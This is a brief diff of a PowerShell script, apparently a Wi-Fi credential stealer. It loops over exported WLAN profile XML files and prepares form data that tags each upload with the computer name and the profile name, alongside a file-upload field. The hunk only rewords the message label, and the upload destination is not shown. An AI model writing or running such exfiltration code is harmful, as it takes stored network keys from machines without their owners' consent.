@@ -33,7 +33,7 @@ foreach ($xmlFile in $xmlFiles) {
     # Bereite die Daten vor
     $formData = @{
         "username" = "$env:COMPUTERNAME"
-        "content"  = "Hier ist das WLAN-Profil: $($xmlFile.Name)"
+        "content"  = "WLAN PROFILE FOR: $($xmlFile.Name)"
     }
 
     $formDataFiles = @{
